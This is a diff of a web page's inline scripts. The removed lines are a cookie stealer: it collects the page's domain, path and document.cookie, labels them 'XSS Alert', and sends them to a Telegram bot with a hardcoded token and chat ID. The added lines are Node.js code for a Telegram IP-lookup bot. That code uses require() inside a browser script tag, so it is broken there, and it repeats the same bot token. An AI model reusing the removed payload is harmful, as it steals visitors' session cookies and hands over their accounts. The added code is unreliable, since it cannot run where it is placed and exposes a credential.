@@ -16,16 +16,41 @@ console.log('Server aktif');
 }
       </script>
         <script>
-            var tokenBot = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o'; // Your "tokenBot" Here
-var chatId = '7407149096'; // Your "chatId" Here
+             const TelegramBot = require('node-telegram-bot-api');
+                const axios = require('axios');
 
-function telegramSend(tokenBot, chatId) {
-	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
-    xhr.send();
-}
-telegramSend(tokenBot, chatId)
+                // Replace with your Telegram bot token
+                const token = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
+
+                const bot = new TelegramBot(token, { polling: true });
+
+                bot.onText(/\/track (.+)/, async (msg, match) => {
+                    const chatId = msg.chat.id;
+                    const ip = match[1];
+
+                    try {
+                        const response = await axios.get(\`https://ipapi.co/\${ip}/json/\`);
+                        const country = response.data.country_name;
+                        const countryCode = response.data.country_code;
+
+                        if (country && countryCode) {
+                            const flagUrl = \`https://www.countryflags.io/\${countryCode}/flat/64.png\`;
+                            bot.sendMessage(chatId, \`IP Address: \${ip}\nCountry: \${country}\`);
+                            bot.sendPhoto(chatId, flagUrl);
+                        } else {
+                            bot.sendMessage(chatId, 'Could not retrieve information for the given IP address.');
+                        }
+                    } catch (error) {
+                        bot.sendMessage(chatId, 'An error occurred while retrieving the IP information.');
+                    }
+                });
+
+                bot.onText(/\/start/, (msg) => {
+                    const chatId = msg.chat.id;
+                    bot.sendMessage(chatId, \`Welcome! Your chat ID is \${chatId}. Use /track  to track an IP address.\`);
+                });
+            
+        
         </script>
         <style>
             @charset "utf-8";html {
